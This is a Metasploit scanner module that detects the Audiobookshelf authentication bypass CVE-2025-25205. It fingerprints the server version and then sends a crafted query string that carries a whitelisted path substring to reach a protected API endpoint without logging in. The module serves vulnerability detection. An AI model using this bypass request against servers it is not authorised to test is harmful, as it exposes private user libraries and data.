##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  # Affected range per the advisory: 2.17.0 <= version <= 2.19.0 (patched in 2.19.1).
  VULNERABLE_MIN = Rex::Version.new('2.17.0')
  PATCHED_VERSION = Rex::Version.new('2.19.1')

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Audiobookshelf Unauthenticated API Authentication Bypass Scanner',
        'Description' => %q{
          This module detects Audiobookshelf servers affected by CVE-2025-25205, an
          unauthenticated authentication bypass. Affected versions (2.17.0 through
          2.19.0) decide whether a GET request may skip authentication by testing an
          unanchored regular expression against the request's full original URL,
          including the query string, rather than the normalized path. By appending a
          query parameter whose value contains a whitelisted substring such as
          /api/items/1/cover, an unauthenticated client reaches protected API
          endpoints.

          The module fingerprints the server and version through the unauthenticated
          /status endpoint, then sends two requests to the protected /api/libraries
          endpoint: a baseline request that must be rejected with HTTP 401, and a
          bypass request carrying the whitelisted substring in its query string. On a
          vulnerable server the bypass request is processed instead of rejected, which
          this module treats as confirmation. It deliberately avoids endpoints such as
          /api/users that crash the server process (the denial-of-service half of this
          CVE).
        },
        'Author' => [
          'swiftbird07', # vulnerability discovery and advisory
          'Kenneth LaCroix' # Metasploit module
        ],
        'References' => [
          ['CVE', '2025-25205'],
          ['GHSA', 'pg8v-5jcv-wrvw'],
          ['URL', 'https://github.com/advplyr/audiobookshelf/commit/ec6537656925a43871b07cfee12c9f383844d224']
        ],
        'DisclosureDate' => '2025-02-12',
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        },
        'DefaultOptions' => { 'RPORT' => 13_378, 'SSL' => false }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path to Audiobookshelf', '/'])
      ]
    )
  end

  # Fingerprint the target via the unauthenticated /status endpoint.
  # Returns the reported server version string, or nil if this does not look
  # like an Audiobookshelf instance.
  def fingerprint_version
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'status')
    )
    return nil unless res && res.code == 200

    json = res.get_json_document
    return nil unless json.is_a?(Hash) && json['app'].to_s.casecmp?('audiobookshelf')

    json['serverVersion']
  end

  # Differential auth-bypass check against the protected /api/libraries endpoint:
  # a baseline request must be rejected with HTTP 401, while the bypass request
  # (carrying a whitelisted substring in its query) is processed instead of
  # rejected. On a vulnerable server the bypass request reaches the handler, which
  # returns 200 or 500 (the handler dereferences the now-undefined user); a patched
  # server returns 401 to both.
  def auth_bypassed?
    baseline = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'api', 'libraries')
    )
    return false unless baseline && baseline.code == 401

    bypass = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'api', 'libraries'),
      'vars_get' => { 'r' => '/api/items/1/cover' }
    )
    return false unless bypass

    bypass.code == 200 || bypass.code == 500
  end

  def check_host(_ip)
    version = fingerprint_version
    return Exploit::CheckCode::Unknown('Target does not appear to be Audiobookshelf') if version.nil?

    return Exploit::CheckCode::Vulnerable("Audiobookshelf #{version} - authentication bypass confirmed") if auth_bypassed?

    begin
      parsed = Rex::Version.new(version)
      if parsed >= VULNERABLE_MIN && parsed < PATCHED_VERSION
        return Exploit::CheckCode::Appears("Audiobookshelf #{version} is in the affected range but the bypass was not confirmed")
      end
    rescue ArgumentError
      # Unparsable version string; fall through to Safe with the raw value.
    end

    Exploit::CheckCode::Safe("Audiobookshelf #{version} - bypass not confirmed")
  end

  def run_host(_ip)
    version = fingerprint_version
    unless version
      vprint_status("#{peer} - Target does not appear to be Audiobookshelf")
      return
    end
    vprint_status("#{peer} - Audiobookshelf #{version} detected")

    unless auth_bypassed?
      print_status("#{peer} - Audiobookshelf #{version} - not vulnerable (authentication enforced)")
      return
    end

    print_good("#{peer} - Audiobookshelf #{version} - unauthenticated API authentication bypass confirmed (CVE-2025-25205)")
    report_vuln(
      host: rhost,
      port: rport,
      name: name,
      info: "Audiobookshelf #{version} unauthenticated API authentication bypass",
      refs: references
    )
  end
end
